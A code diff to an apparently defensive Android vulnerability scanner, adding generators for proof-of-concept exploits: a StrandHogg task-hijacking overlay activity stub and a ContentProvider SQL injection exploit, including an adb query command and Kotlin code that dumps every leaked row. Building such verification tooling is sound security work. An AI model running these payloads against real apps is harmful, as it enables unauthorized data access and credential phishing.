@@ -36,6 +36,10 @@ class ExploitPocSynthesizer:
             return self._synthesize_pending_intent_poc(finding, target_package)
         elif "FILEPROVIDER" in fid or "FILE_PROVIDER" in fid or cwe == "CWE-22":
             return self._synthesize_file_provider_poc(finding, target_package)
+        elif "TASK_AFFINITY" in fid or "TASK_HIJACKING" in fid or cwe == "CWE-1021":
+            return self._synthesize_task_hijacking_poc(finding, target_package)
+        elif "CONTENT_PROVIDER" in fid or "PROVIDER_SQLI" in fid or (cwe == "CWE-89" and "content" in finding.title.lower()):
+            return self._synthesize_content_provider_sqli_poc(finding, target_package)
 
         return None
 
@@ -180,3 +184,80 @@ class FileProviderExploit : Activity() {{
             kotlin_exploit_code=kotlin_code,
             explanation=f"Reads unauthorized sensitive app data via exposed FileProvider authority '{authority}'.",
         )
+
+    def _synthesize_task_hijacking_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
+        target_activity = finding.affected_component or f"{target_package}.MainActivity"
+        task_affinity = finding.metadata.get("task_affinity", target_package)
+        adb_cmd = f"adb shell am start -n com.attacker.exploit/.StrandHoggActivity"
+        kotlin_code = f"""// Standalone Exploit PoC for Task Hijacking / StrandHogg ({finding.id})
+package com.attacker.exploit
+
+import android.app.Activity
+import android.content.Intent
+import android.os.Bundle
+
+/**
+ * Attacker AndroidManifest.xml configuration:
+ * <activity
+ *     android:name=".StrandHoggActivity"
+ *     android:taskAffinity="{task_affinity}"
+ *     android:allowTaskReparenting="true"
+ *     android:exported="true">
+ *     <intent-filter>
+ *         <action android:name="android.intent.action.MAIN" />
+ *         <category android:name="android.intent.category.LAUNCHER" />
+ *     </intent-filter>
+ * </activity>
+ */
+class StrandHoggActivity : Activity() {{
+    override fun onCreate(savedInstanceState: Bundle?) {{
+        super.onCreate(savedInstanceState)
+        // This malicious activity places itself atop the victim's task stack.
+        // When the user launches {target_package}, this overlay activity is shown to steal credentials.
+    }}
+}}
+"""
+        return GeneratedPoc(
+            finding_id=finding.id,
+            vulnerability_type="Task Affinity / StrandHogg Hijacking",
+            adb_command=adb_cmd,
+            kotlin_exploit_code=kotlin_code,
+            explanation=(
+                f"Creates an overlay activity matching the victim's taskAffinity '{task_affinity}' "
+                f"to hijack task execution when '{target_activity}' is launched."
+            ),
+        )
+
+    def _synthesize_content_provider_sqli_poc(self, finding: Finding, target_package: str) -> GeneratedPoc:
+        authority = finding.metadata.get("authority", f"{target_package}.provider")
+        uri = f"content://{authority}/query"
+        projection = "* FROM users WHERE 1=1 --"
+        adb_cmd = f"adb shell content query --uri \"{uri}\" --projection \"{projection}\""
+        kotlin_code = f"""// Standalone Exploit PoC for ContentProvider SQL Injection ({finding.id})
+package com.attacker.exploit
+
+import android.app.Activity
+import android.net.Uri
+import android.os.Bundle
+
+class ProviderSqliExploit : Activity() {{
+    override fun onCreate(savedInstanceState: Bundle?) {{
+        super.onCreate(savedInstanceState)
+        val uri = Uri.parse("{uri}")
+        val cursor = contentResolver.query(uri, arrayOf("{projection}"), null, null, null)
+        cursor?.use {{ c ->
+            while (c.moveToNext()) {{
+                println("Leaked Row: " + (0 until c.columnCount).joinToString {{ c.getString(it) ?: "null" }})
+            }}
+        }}
+    }}
+}}
+"""
+        return GeneratedPoc(
+            finding_id=finding.id,
+            vulnerability_type="ContentProvider SQL Injection",
+            adb_command=adb_cmd,
+            kotlin_exploit_code=kotlin_code,
+            explanation=f"Queries exposed ContentProvider authority '{authority}' injecting arbitrary SQL projection syntax.",
+        )
+
